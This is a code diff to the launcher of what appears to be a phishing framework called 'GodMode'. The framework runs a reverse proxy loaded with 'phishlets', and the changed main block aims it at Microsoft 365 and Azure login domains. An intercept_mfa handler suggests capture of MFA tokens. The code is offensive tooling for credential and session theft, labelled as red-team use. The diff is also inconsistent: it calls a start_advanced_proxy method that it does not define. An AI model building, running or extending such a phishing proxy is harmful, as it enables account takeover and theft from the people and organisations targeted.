@@ -1,13 +1,15 @@
 #!/usr/bin/env python3
+import logging
 import os
+import subprocess
 import sys
 import time
-import subprocess
-import logging
+
 import httpx
 import uvicorn
-from fastapi import FastAPI, Request, HTTPException
+from fastapi import FastAPI, HTTPException, Request
 from fastapi.responses import HTMLResponse, RedirectResponse
+
 from core.banner import print_alex_banner
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] GODMODE: %(message)s", datefmt="%H:%M:%S")
@@ -31,7 +33,7 @@ class GodModeRunner:
     def __init__(self):
         self.processes = []
     def start_api(self):
-        cmd = [sys.executable, "-m", "uvicorn", "api.rest_api:app", "--host", "0.0.0.0", "--port", "8000", "--reload"]
+        cmd = [sys.executable, "-m", "uvicorn", "api.rest_api:app", "--host", "0.0.0.0", "--port", "8000"]
         p = subprocess.Popen(cmd)
         self.processes.append(p)
     def wait_api(self, timeout=15):
@@ -45,10 +47,13 @@ class GodModeRunner:
             except Exception:
                 time.sleep(0.5)
         return False
-    def start_proxy(self, phishlet="phishlets/twitter.yaml"):
+    def start_proxy(self, phishlet="phishlets/twitter.yaml", redteam_domains=""):
         env = os.environ.copy()
         env["PHISHLET"] = phishlet
+        if redteam_domains:
+            env["REDTEAM_DOMAINS"] = redteam_domains
         # Use advanced proxy for Red Team operations
+        print(f"Starting advanced proxy with phishlet: {phishlet} and domains: {redteam_domains or '(non spécifié)'}")
         p = subprocess.Popen([sys.executable, "engine/advanced_proxy.py"], env=env)
         self.processes.append(p)
     
@@ -159,8 +164,7 @@ async def intercept_mfa(content: str):
             return response.json()
     except Exception as e:
         return {"error": str(e)}
-    logger.info(f"{ip} -> {provider.upper()}")
-    return RedirectResponse(url=url)
+
 
 if __name__ == "__main__":
     print_alex_banner()
@@ -169,7 +173,12 @@ if __name__ == "__main__":
     try:
         runner.start_api()
         runner.wait_api()
-        runner.start_proxy()
+        print("About to start advanced proxy")
+        runner.start_advanced_proxy(
+            phishlet="phishlets/advanced_office365.yaml",
+            redteam_domains="login.microsoftonline.com,www.office.com,outlook.office365.com,portal.azure.com"
+        )
+        print("Advanced proxy started")
         runner.open_war_room()
         runner.run_templates()
         runner.run_mutation()
